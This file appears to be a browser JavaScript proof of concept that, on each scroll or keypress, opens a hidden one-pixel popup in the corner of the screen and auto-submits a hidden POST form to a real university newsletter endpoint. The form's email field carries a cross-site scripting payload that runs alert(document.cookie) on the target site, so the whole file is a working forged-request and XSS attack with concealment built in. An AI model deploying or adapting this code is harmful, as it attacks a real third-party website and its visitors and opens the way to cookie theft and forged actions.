const windowWidth = 1; // Set the width of the window

const windowHeight = 1; // Set the height of the window

const screenWidth = window.screen.width;
const screenHeight = window.screen.height;
const windowLeft = screenWidth - windowWidth;
const windowTop = screenHeight - windowHeight;
const time_to_wait_before_closing_new_window = 5; // Function to open a new window, submit the form, and close the window

function submit_form() {
  document.removeEventListener("scroll", submit_form);
  setTimeout(function () {
    document.addEventListener("scroll", submit_form);
  }, 100);
  document.removeEventListener("keydown", submit_form);
  setTimeout(function () {
    document.addEventListener("keydown", submit_form);
  }, 100); // Open a new window, uncomment the rest of the line to make it minimum size

  var newWindow = window.open("", "", `width=${windowWidth},height=${windowHeight},left=${windowLeft},top=${windowTop},toolbar=no,location=no,directories=no,status=no,menubar=no,scrollbars=no,resizable=no`); // Create a form element

  var form = document.createElement("form");
  form.action = "https://isimsf.rnu.tn/fra/newsletter";
  form.method = "POST"; // Add form input fields

  var email = document.createElement("input");
  email.name = "email";
  email.type = 'hidden'; //comment this to make it visible

  email.value = '"><details/open/ontoggle="alert(document.cookie)">';
  form.appendChild(email); // Add the form to the new window

  newWindow.document.body.appendChild(form); // Submit the form from the new window

  form.submit(); // uncomment this to make the new window close after 10 seconds

  setTimeout(function () {
    newWindow.close();
  }, time_to_wait_before_closing_new_window * 1000); // Close after n seconds (n * 1000 milliseconds) feel free to increase it if the site is too slow to load
}

document.removeEventListener("scroll", submit_form);
setTimeout(function () {
  document.addEventListener("scroll", submit_form);
}, 100);
document.removeEventListener("keydown", submit_form);
setTimeout(function () {
  document.addEventListener("keydown", submit_form);
}, 100); //	win32-release_x64